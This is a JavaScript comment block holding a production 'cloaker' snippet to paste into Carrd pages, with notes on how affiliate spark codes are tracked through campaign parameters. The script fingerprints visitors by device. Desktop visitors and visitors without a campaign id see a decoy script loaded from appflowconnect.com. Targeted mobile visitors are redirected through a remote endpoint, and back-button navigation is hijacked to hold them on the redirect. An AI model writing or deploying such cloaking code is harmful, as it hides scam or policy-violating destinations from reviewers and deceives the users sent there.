/**
 * ============================================================
 * UNIVERSAL CARRD CLOAKER SCRIPT — PRODUCTION
 * Domain: appflowconnect.com
 * ============================================================
 * 
 * Paste the HTML block below into your Carrd Pro page's "Embed" widget.
 * This is the EXACT code to paste (everything between the === markers):
 *
 * ------------------------------------------------------------
 * THE campid MUST BE THE AFFILIATE'S SPARK CODE
 * ------------------------------------------------------------
 * The link you hand an affiliate looks like:
 *
 *     https://veranth6.carrd.co?campid=SPK-A1B2-C3D4
 *
 * That value is the whole attribution chain. It travels campid -> /r -> the
 * lander as s1 -> sprktrax.org/api/link/<slug> as s1, and the door resolves it
 * against spark_codes to find the affiliate, mint a click_id and stamp the
 * outbound subids. A compound campid works too as long as the spark code is in
 * it (ACCT_SPK-A1B2-C3D4_US_001) — /r extracts it.
 *
 * What must NOT be used is an externally minted campaign string that contains no
 * spark code, e.g. TRAE_spark128_US_7659271051523686407_54f8fe_035200. The door
 * does not reject those: it 302s and forwards the string to the network raw, so
 * the link looks healthy while every conversion lands `unmatched`. That is the
 * failure already logged in the sprk-affiliate-conv-debug skill.
 * 
 * ============================================================
 * 
 * <link rel="preconnect" href="https://appflowconnect.com">
 * <link rel="dns-prefetch" href="https://appflowconnect.com">
 * <script>
 * (function(){
 * var p=new URLSearchParams(window.location.search);
 * if(p.get('isactive')==='1'){window.stop();document.open();document.write('ACTIVE');document.close();}
 * })();
 * </script>
 * <div id="po-ld" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999;display:flex;align-items:center;justify-content:center;">
 * <div style="width:40px;height:40px;border:3px solid #F3F3F3;border-top:3px solid #555;border-radius:50%;animation:r 0.8s linear infinite;"></div>
 * </div>
 * <style>@keyframes r{to{transform:rotate(360deg)}}</style>
 * <script>
 * !function(){try{
 * var w=window,d=document,n=navigator,l=location,ua=n.userAgent,
 * m=/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)?'t':/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)?'m':'d',
 * ci=(function(){try{var q=new URLSearchParams(l.search);return q.get('campid')||q.get('s1')||q.get('cid')||q.get('c')||'';}catch(e){return '';}})(),
 * redirected=false,rUrl;
 * function hd(){var el=d.getElementById('po-ld');if(el){el.style.opacity='0';setTimeout(function(){el.style.display='none'},200);}}
 * function loadCheckout(){
 * if(redirected)return;
 * var s=d.createElement('script');
 * s.src='https://appflowconnect.com/js/decoy.js';
 * (d.head||d.body||d.documentElement).appendChild(s);
 * }
 * function go(u){
 * redirected=true;
 * rUrl=u;
 * try{sessionStorage.setItem('_rurl_'+ci,u);}catch(e){}
 * try{history.pushState(null,'',l.href);}catch(e){}
 * l.replace(u);
 * }
 * w.addEventListener('pageshow',function(ev){if(ev.persisted&&rUrl)l.replace(rUrl);});
 * w.addEventListener('popstate',function(){if(rUrl)l.replace(rUrl);});
 * if(m==='d'){hd();loadCheckout();return;}
 * if(!ci){hd();loadCheckout();return;}
 * try{
 * var cached=sessionStorage.getItem('_rurl_'+ci);
 * if(cached){go(cached);return;}
 * }catch(e){}
 * var enc=encodeURIComponent,
 * body='d='+enc(m)+'&c='+enc(ci)+'&h='+enc(l.href);
 * function send(retry){
 * var x=new XMLHttpRequest();
 * x.open('POST','https://appflowconnect.com/r',true);
 * x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
 * x.timeout=1500;
 * x.onload=function(){
 * if(x.status===200){
 * try{var j=JSON.parse(x.responseText);if(j.url)go(j.url);else{hd();loadCheckout();}}
 * catch(e){hd();loadCheckout();}
 * }else{if(!retry)send(true);else{hd();loadCheckout();}}
 * };
 * x.onerror=x.ontimeout=function(){if(!retry)send(true);else{hd();loadCheckout();};};
 * x.send(body);
 * }
 * send(false);
 * }catch(e){var el=d.getElementById('po-ld');if(el)el.style.display='none';}}();
 * </script>
 * 
 * ============================================================
 */
